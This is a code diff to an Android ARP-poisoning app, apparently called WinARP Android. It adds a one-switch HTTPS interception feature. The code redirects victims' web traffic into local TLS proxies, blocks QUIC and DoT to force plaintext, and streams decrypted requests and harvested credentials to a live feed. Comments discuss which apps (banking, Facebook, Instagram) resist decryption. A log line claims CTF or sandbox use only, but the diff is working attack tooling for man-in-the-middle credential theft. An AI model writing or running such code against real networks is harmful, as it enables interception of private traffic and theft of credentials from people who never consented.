@@ -64,6 +64,7 @@ data class MainUiState(
     val showSettings: Boolean = false,
     val showRaw: Boolean = false,
     val forcePlaintext: Boolean = false,
+    val interceptHttps: Boolean = false,
     val spoofConfig: SpoofConfig = SpoofConfig(),
     val spoofHtml: String = WebServer.DEFAULT_PAGE,
     val hostControls: Map<String, HostControl> = emptyMap(),
@@ -113,6 +114,25 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
     val hostBps: StateFlow<Double> = _hostBps.asStateFlow()
     private var meterJob: Job? = null
 
+    /** Decrypted HTTPS requests + harvested credentials, shown live on the Sniff tab. */
+    private val _intercept = MutableStateFlow<List<String>>(emptyList())
+    val intercept: StateFlow<List<String>> = _intercept.asStateFlow()
+
+    private fun pushIntercept(line: String) {
+        val ts = synchronized(timeFmt) { timeFmt.format(Date()) }
+        _intercept.update { (it + "$ts  $line").let { l -> if (l.size > 300) l.takeLast(300) else l } }
+    }
+
+    /** Sink for every line the local proxies emit: goes to the log AND the live intercept feed. */
+    private fun onProxyLine(line: String) {
+        appendLog(line)
+        if (line.startsWith("[TLS]") || line.startsWith("[CREDS]")) pushIntercept(line)
+    }
+
+    fun clearIntercept() {
+        _intercept.value = emptyList()
+    }
+
     init {
         // restore sticky settings from previous runs
         val s = prefs.load()
@@ -134,6 +154,7 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
         // auto-persist sticky settings on change (distinctUntilChanged ignores log/scan churn)
         state.map { it.toSettings() }.distinctUntilChanged().onEach { prefs.save(it) }.launchIn(viewModelScope)
 
+        web.setCredSink { onProxyLine(it) }
         appendLog("WinARP Android - LAN scan / multi-thread ARP poison")
         appendLog("Tip: scanning works without root; disruption attack needs Root + AF_PACKET")
         appendLog("For CTF / authorized sandbox only")
@@ -433,12 +454,13 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
         capture.stop()
         web.stop()
         tls.stop()
-        _state.update { it.copy(hostControls = emptyMap(), forcePlaintext = false, showRaw = false) }
+        _state.update { it.copy(hostControls = emptyMap(), forcePlaintext = false, showRaw = false, interceptHttps = false) }
         if (iface != null) {
             viewModelScope.launch {
                 RootNet.clearControls(iface.name)
                 RootNet.forcePlaintext(iface.name, false)
                 RootNet.disableHttpRedirect(iface.name, _state.value.spoofConfig.port)
+                RootNet.disableHttpsRedirect(iface.name, tlsPort)
                 RootNet.disableForwarding(iface.name)
             }
         }
@@ -457,6 +479,44 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
                 on -> appendLog("[+] force plaintext ON — blocked DoT(853) + QUIC(443)")
                 else -> appendLog("[+] force plaintext OFF")
             }
+        }
+    }
+
+    /**
+     * Global HTTPS interception: REDIRECT every forwarded victim's :80/:443 into our local proxies
+     * and block QUIC/DoT so nothing slips past. One switch instead of per-host opt-in — this is why
+     * the earlier per-host flow looked like "nothing happened". Requires an active MITM attack to
+     * feed it; pinned apps (banking/FB/IG) still can't be decrypted and are reported as such.
+     */
+    fun toggleInterceptHttps() {
+        val iface = _state.value.selectedIface ?: run { appendLog("[-] select a NIC first"); return }
+        val on = !_state.value.interceptHttps
+        _state.update { it.copy(interceptHttps = on) }
+        val port = _state.value.spoofConfig.port
+        if (on) {
+            val we = ensureWebServer()
+            if (we != null) appendLog("[!] proxy server: $we")
+            if (!tls.running.value) {
+                val te = tls.start(getApplication<Application>(), tlsPort) { line -> onProxyLine(line) }
+                if (te != null) appendLog("[!] TLS proxy: $te")
+            }
+            _state.update { it.copy(forcePlaintext = true) }
+            viewModelScope.launch {
+                RootNet.enableHttpRedirect(iface.name, port)
+                RootNet.enableHttpsRedirect(iface.name, tlsPort)
+                RootNet.forcePlaintext(iface.name, true)
+                appendLog("[+] Decrypt HTTPS ON — :80→:$port, :443→:$tlsPort, QUIC/DoT blocked")
+                appendLog("[i] results appear on Sniff (Decrypted). Attack a host with Keep online (MITM) to feed it. Pinned apps (banking/FB/IG) won't decrypt — shown as 'pinned'.")
+            }
+        } else {
+            _state.update { it.copy(forcePlaintext = false) }
+            viewModelScope.launch {
+                RootNet.disableHttpsRedirect(iface.name, tlsPort)
+                RootNet.disableHttpRedirect(iface.name, port)
+                RootNet.forcePlaintext(iface.name, false)
+                appendLog("[+] Decrypt HTTPS OFF")
+            }
+            tls.stop()
         }
     }
 
@@ -532,7 +592,7 @@ class MainViewModel(app: Application) : AndroidViewModel(app) {
             if (e == null) appendLog("[+] local proxy (:80) ready on :${_state.value.spoofConfig.port}")
             else appendLog("[!] proxy server: $e")
             if (!tls.running.value) {
-                val te = tls.start(getApplication<Application>(), tlsPort) { line -> appendLog(line) }
+                val te = tls.start(getApplication<Application>(), tlsPort) { line -> onProxyLine(line) }
                 if (te == null) appendLog("[+] TLS MITM (:443) ready on :$tlsPort — decrypts non-validating/CA-trusting hosts")
                 else appendLog("[!] TLS proxy: $te")
             }
